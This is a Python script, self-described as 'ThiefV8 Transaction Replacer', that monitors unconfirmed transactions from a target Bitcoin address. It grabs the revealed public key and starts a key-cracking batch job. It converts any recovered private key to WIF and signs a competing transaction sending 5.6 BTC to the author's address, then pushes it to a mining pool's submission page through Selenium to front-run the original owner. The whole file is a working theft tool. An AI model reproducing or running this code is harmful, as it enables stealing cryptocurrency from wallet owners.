import time
import requests
import subprocess
import logging
import hashlib
import base58
from bitcoinlib.wallets import Wallet
from bitcoinlib.transactions import Transaction
from bitcoinlib.networks import Network
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# Configure logging
logging.basicConfig(filename='error_log.txt', level=logging.ERROR,
                    format='%(asctime)s - %(levelname)s - %(message)s')
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.ERROR)
logging.getLogger().addHandler(console_handler)

# Constants
API_KEY = 'apiKeyApiKeyApikey' # edit with your exchange.blockchain.com Api Key, find it in settings
WALLET_ADDRESS = '1BY8GQbnueYofwSuFAT3USAhGjPrkxDdW9'  # Update with target address, in this example its monitoring 67 address
RESULT_FILE = 'result.txt'
IN_FILE = 'in.txt'
TRANSACTION_URL = 'https://blockchain.info/unspent?active=' + WALLET_ADDRESS 

# Function to check for outgoing transactions
def check_outgoing_transactions():
    try:
        url = "https://blockchain.info/unconfirmed-transactions?format=json"
        response = requests.get(url)
        
        if response.status_code != 200:
            return None
            
        data = response.json()
        
        # Loop through transactions and check if the wallet address is in the inputs
        for tx in data['txs']:
            for inp in tx['inputs']:
                if inp.get('prev_out', {}).get('addr') == WALLET_ADDRESS:
                    return inp.get('witness', '').split('0121')[1][:66]  # Extract public key
        return None
        
    except Exception as e:
        logging.error(f"Error checking outgoing transactions: {e}")
    return None

# Function to edit the in.txt file
def edit_in_file(public_key):
    try:
        with open(IN_FILE, 'w') as f:
            f.write("200000000000000000\n")  # Specify start range hex
            f.write("3fffffffffffffffff\n")  # Specify end range hex
            f.write(f"{public_key}\n")
    except Exception as e:
        logging.error(f"Error editing in.txt file: {e}")

# Function to extract and convert the private key to WIF
def check_private_key():
    try:
        with open(RESULT_FILE, 'r') as f:
            for line in f:
                if line.startswith("       Priv:"):  # Extract the private key
                    priv_key = line.split(':')[1].strip()  
                    logging.info(f"Found private key: {priv_key}")  # Log the found private key

                    # Remove '0x' prefix if present
                    if priv_key.startswith("0x"):
                        priv_key = priv_key[2:]

                    # Check if the private key is 64 characters long after padding
                    if len(priv_key) > 64:
                        logging.error("Invalid private key format: too many characters.")
                        return None
                    
                    if all(c in '0123456789abcdefABCDEF' for c in priv_key):  # Check if it's hexadecimal
                        priv_key = priv_key.zfill(64)  # Pads with leading zeros

                        # Add the version byte (0x80 for mainnet Bitcoin)
                        versioned_key = '80' + priv_key

                        # Step 1: Perform SHA256 hash twice
                        first_hash = hashlib.sha256(bytes.fromhex(versioned_key)).hexdigest()
                        second_hash = hashlib.sha256(bytes.fromhex(first_hash)).hexdigest()

                        # Step 2: Take the first 4 bytes of the second hash for checksum
                        checksum = second_hash[:8]

                        # Step 3: Concatenate the versioned key with the checksum
                        wif_key = versioned_key + checksum

                        # Step 4: Convert the hexadecimal string to bytes and encode in Base58
                        wif_key_bytes = bytes.fromhex(wif_key)
                        wif_encoded = base58.b58encode(wif_key_bytes)

                        return wif_encoded.decode('utf-8')
                    else:
                        logging.error("Invalid private key format: non-hexadecimal characters found.")
    except Exception as e:
        logging.error(f"Error checking private key: {e}")
    return None

# Function to create and sign a raw transaction
def create_raw_transaction(wif_key):
    try:
        # Create a wallet object with the private key
        wallet = Wallet.create('TempWallet', keys=wif_key, network='bitcoin', witness_type='legacy')
        
        # Transaction details
        recipient_address = 'bc1q77sekfapwfnvs9w5dwutcsjyf8lpf7sn0fmfgn' # your btc address
        amount_to_send = 5.6  # Amount in BTC
        transaction_fee = 1.0  # Transaction fee in BTC

        # Create a transaction object
        tx = Transaction(network='bitcoin', outputs=[(recipient_address, amount_to_send, 'btc')])
        
        # Add the wallet's UTXOs (Unspent Transaction Outputs) to the transaction
        tx.inputs.extend(wallet.utxos())
        
        # Set the fee
        tx.fee = transaction_fee

        # Sign the transaction
        tx.sign(wallet)

        # Get the hexadecimal string (transaction hex)
        transaction_hex = tx.as_hex()
        
        return transaction_hex
    except Exception as e:
        logging.error(f"Error creating raw transaction: {e}")
    return None

# Main function
def main():
    logging.info("Starting the main function.")
    print("Started ThiefV8 Transaction Replacer for " + WALLET_ADDRESS)
    while True:
        try:
            public_key = check_outgoing_transactions()
            if public_key:
                edit_in_file(public_key)  # Write public key to in.txt

                # Open kang.bat in a new terminal window
                subprocess.run(['start', 'cmd', '/c', 'kang.bat'], shell=True)
            
            wif_key = check_private_key()
            if wif_key:
                transaction_hex = create_raw_transaction(wif_key)
                
                # Check if transaction_hex is not None or empty
                if transaction_hex:
                    try:
                        chrome_options = Options()
                        service = Service('C:/Users/Computer/Desktop/chromedriver-win64/chromedriver.exe')  # Update the path to your chromedriver
                        driver = webdriver.Chrome(service=service, options=chrome_options)
                        driver.get("https://slipstream.mara.com/")
                        
                        text_area = driver.find_element(By.CSS_SELECTOR, "#root > div > div.sc-blmEgr.bHsWzC > div > div.sc-lnsjTu.kXxczm > div > textarea")
                        text_area.send_keys(transaction_hex)  # Make sure transaction_hex is defined
                        button = driver.find_element(By.CSS_SELECTOR, "#root > div > div.sc-blmEgr.bHsWzC > div > div.sc-lnsjTu.kXxczm > div > button")
                        button.click()  # Click the button after sending keys
                        print("Sent transaction hex for " + WALLET_ADDRESS)
                      
                        time.sleep(1000)
 

                    except Exception as e:
                        logging.error(f"Error interacting with the browser: {e}")
                else:
                    logging.error("transaction_hex is not defined or is empty. Probably wallet has already spent the BTC.")

        except Exception as e:
            logging.error(f"Error in main loop: {e}")

if __name__ == "__main__":
    main()